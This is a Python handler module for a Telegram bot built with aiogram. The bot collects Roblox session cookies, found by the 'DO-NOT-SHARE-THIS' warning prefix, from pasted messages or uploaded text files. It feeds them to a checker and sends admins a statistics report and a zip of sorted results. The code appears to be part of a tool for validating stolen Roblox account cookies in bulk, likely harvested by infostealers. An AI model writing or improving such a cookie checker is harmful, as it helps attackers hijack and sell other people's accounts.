import time
from aiogram import Router, types, F
from src.checker import RobloxChecker
from src.sorter import ReportGenerator
from src.bot import ADMIN_IDS

router = Router()

def extract_cookies(text: str):
    return [l.strip() for l in text.split('\n') if "_|WARNING:-DO-NOT-SHARE-THIS" in l]

async def run_logic(message: types.Message, cookies: list):
    if message.from_user.id not in ADMIN_IDS:
        return

    start_time = time.time()
    checker = RobloxChecker()
    status_msg = await message.answer("📡 <b>Проверка запущена...</b>", parse_mode="HTML")
    
    results = await checker.process_cookies(cookies)
    reporter = ReportGenerator(results, start_time, admin_id=message.from_user.id)
    
    report_text = reporter.generate_stats_message()
    zip_path = reporter.create_files()
    
    await status_msg.delete()
    await message.answer_document(
        types.FSInputFile(zip_path),
        caption=report_text,
        parse_mode="HTML"
    )

@router.message(F.text)
async def text_handler(message: types.Message):
    cookies = extract_cookies(message.text)
    if cookies:
        await run_logic(message, cookies)

@router.message(F.document.file_name.endswith('.txt'))
async def file_handler(message: types.Message, bot):
    if message.from_user.id not in ADMIN_IDS:
        return

    file = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file.file_path)
    content = downloaded.read().decode('utf-8', errors='ignore')
    
    cookies = extract_cookies(content)
    if cookies:
        await message.answer(f"📥 Файл принят. Найдено: {len(cookies)}")

        await run_logic(message, cookies)
